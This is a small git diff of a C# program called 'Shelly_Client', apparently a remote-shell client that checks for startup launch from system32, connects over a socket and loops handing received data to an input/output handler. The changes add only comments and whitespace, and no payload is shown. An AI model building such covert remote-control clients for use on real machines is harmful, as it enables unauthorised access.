@@ -17,7 +17,7 @@ namespace Shelly_Client
         public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         static void Main(string[] args)
-        {
+        {            
             // Check if program is launched in system32 NOTE: Happens at startup
             if (ExecutionPath == Environment.SystemDirectory)
             {
@@ -39,6 +39,7 @@ namespace Shelly_Client
                 // Try to connect
                 try
                 {
+                    // Connect
                     SocketHandler.Connect();
                 }
                 catch
@@ -54,6 +55,7 @@ namespace Shelly_Client
                     // Try to read data
                     try
                     {
+                        // Read data, parse to IO method
                         InputOutput.IO(SocketHandler.Receive());
                     }
                     catch
